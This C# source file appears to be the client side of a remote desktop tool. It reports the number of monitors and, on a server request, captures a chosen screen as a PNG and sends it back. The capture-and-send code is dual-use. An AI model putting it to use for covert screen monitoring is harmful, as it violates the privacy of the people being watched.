using Client.Packets.ClientPackets;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace Client.Controllers
{
    static class RemoteDesktopController
    {

        public static void getMonitors(ClientMosaic client)
        {
            if (Screen.AllScreens.Length > 0)
            {
                new Packets.ClientPackets.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
            }
        }

        public static void getDesktop(Packets.ServerPackets.GetDesktop packet, ClientMosaic client)
        {
            byte[] desktop;
            Rectangle bounds = Screen.AllScreens[packet.monitor].Bounds;
            Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graph = Graphics.FromImage(bitmap);
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            using (var stream = new MemoryStream())
            {
                bitmap.Save(stream, ImageFormat.Png);
                desktop = stream.ToArray();
            }
            new GetDesktopResponse(desktop, packet.monitor).Execute(client);
        }
    }
}
